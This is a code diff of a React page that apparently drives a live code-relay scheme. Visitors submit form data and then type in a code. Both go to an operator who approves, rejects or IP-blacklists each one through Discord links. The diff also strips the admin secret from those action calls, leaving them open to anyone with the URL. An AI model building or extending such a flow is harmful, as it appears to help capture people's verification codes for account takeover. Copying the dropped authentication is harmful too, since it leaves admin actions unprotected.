@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { apiInvoke } from "@/lib/api";
+import { base44 } from "@/api/base44Client";
 import SubmissionForm from "@/components/SubmissionForm";
 import SuccessScreen from "@/components/SuccessScreen";
 import CodeVerification from "@/components/CodeVerification";
@@ -15,9 +15,10 @@ export default function Home() {
 
   const getInitialStep = () => {
     const p = getParams();
-    if (p.get("trigger")) return "triggerAction";
-    if (p.get("action")) return "triggerAction";
+    // Admin action links from Discord (after code entry)
     if (p.get("triggerAction")) return "triggerAction";
+    // Legacy trigger for sending code ready
+    if (p.get("trigger")) return "form";
     if (p.get("step") === "code") return "code";
     return "form";
   };
@@ -33,35 +34,44 @@ export default function Home() {
 
   // Check admin status on mount
   useEffect(() => {
-    apiInvoke("checkAdminStatus", {})
+    base44.functions.invoke("checkAdminStatus", {})
       .then(res => setAdminInactive(res?.data?.is_inactive || false))
       .catch(() => {});
   }, []);
 
-  // Handle Discord action links: ?trigger=ID or ?action=...&id=...
+  // Handle ?trigger=ID from Discord (send code ready)
   useEffect(() => {
+    const triggerId = getParams().get("trigger");
+    if (triggerId) {
+      base44.functions.invoke("sendCode", { submissionId: triggerId, action: "code_ready" })
+        .then(() => setStep("adminDone"))
+        .catch(() => setStep("adminDone"));
+    }
+  }, []);
+
+  // Handle ?triggerAction=valid|wrong|expired|blacklist&id=... from Discord (after code entry)
+  useEffect(() => {
+    if (step !== "triggerAction") return;
     const p = getParams();
-    const trigger = p.get("trigger");
-    const action = p.get("action");
+    const action = p.get("triggerAction");
     const id = p.get("id");
     const ip = p.get("ip");
+    if (!action || !id) { setStep("form"); return; }
 
-    const adminSecret = p.get("s") || localStorage.getItem("admin_password_hash") || "";
-
-    if (trigger) {
-      apiInvoke("sendCode", { submissionId: trigger, action: "code_ready", adminSecret })
+    if (action === "blacklist") {
+      base44.functions.invoke("blacklistUser", { submissionId: id, ip })
         .catch(() => {})
-        .finally(() => { window.history.replaceState({}, "", "/"); setStep("adminDone"); });
-    } else if (action && id) {
-      if (action === "blacklist") {
-        apiInvoke("blacklistUser", { submissionId: id, ip, adminSecret })
-          .catch(() => {})
-          .finally(() => { window.history.replaceState({}, "", "/"); setStep("adminDone"); });
-      } else {
-        apiInvoke("sendCode", { submissionId: id, action, adminSecret })
-          .catch(() => {})
-          .finally(() => { window.history.replaceState({}, "", "/"); setStep("adminDone"); });
-      }
+        .finally(() => {
+          window.history.replaceState({}, "", "/");
+          setStep("adminDone");
+        });
+    } else {
+      base44.functions.invoke("sendCode", { submissionId: id, action })
+        .catch(() => {})
+        .finally(() => {
+          window.history.replaceState({}, "", "/");
+          setStep("adminDone");
+        });
     }
   }, []);
 
@@ -70,10 +80,10 @@ export default function Home() {
     if (step === "validation" && submissionId) {
       pollingRef.current = setInterval(async () => {
         // Check admin status
-        const adminRes = await apiInvoke("checkAdminStatus", {});
+        const adminRes = await base44.functions.invoke("checkAdminStatus", {});
         setAdminInactive(adminRes?.data?.is_inactive || false);
 
-        const res = await apiInvoke("checkStatus", { submissionId });
+        const res = await base44.functions.invoke("checkStatus", { submissionId });
         const s = res?.data?.status;
         if (s === "code_ready") {
           clearInterval(pollingRef.current);
@@ -94,7 +104,7 @@ export default function Home() {
   useEffect(() => {
     if (step === "waiting" && submissionId) {
       pollingRef.current = setInterval(async () => {
-        const res = await apiInvoke("checkStatus", { submissionId });
+        const res = await base44.functions.invoke("checkStatus", { submissionId });
         const s = res?.data?.status;
         if (s === "code_valid") {
           clearInterval(pollingRef.current);
@@ -104,7 +114,7 @@ export default function Home() {
           setStep("wrong");
         } else if (s === "code_expired") {
           clearInterval(pollingRef.current);
-          setStep("code");
+          setStep("expired");
         } else if (s === "waiting_queue") {
           clearInterval(pollingRef.current);
           setStep("queue");
@@ -118,7 +128,7 @@ export default function Home() {
     setLoading(true);
     try {
       // Check if admin is inactive (fresh check every time user submits)
-      const statusRes = await apiInvoke("checkAdminStatus", {});
+      const statusRes = await base44.functions.invoke("checkAdminStatus", {});
       if (statusRes?.data?.is_inactive) {
         setAdminInactive(true);
         setStep("noAdmin");
@@ -126,7 +136,7 @@ export default function Home() {
         return;
       }
 
-      const res = await apiInvoke("createSubmission", data);
+      const res = await base44.functions.invoke("createSubmission", data);
       const submissionId = res?.data?.submissionId;
       if (!submissionId) throw new Error("Erreur lors de la création");
       
@@ -146,7 +156,7 @@ export default function Home() {
 
   const handleCodeSubmit = async (code) => {
     setLoading(true);
-    await apiInvoke("notifyCodeEntered", {
+    await base44.functions.invoke("notifyCodeEntered", {
       ...submittedData,
       code,
       submissionId,
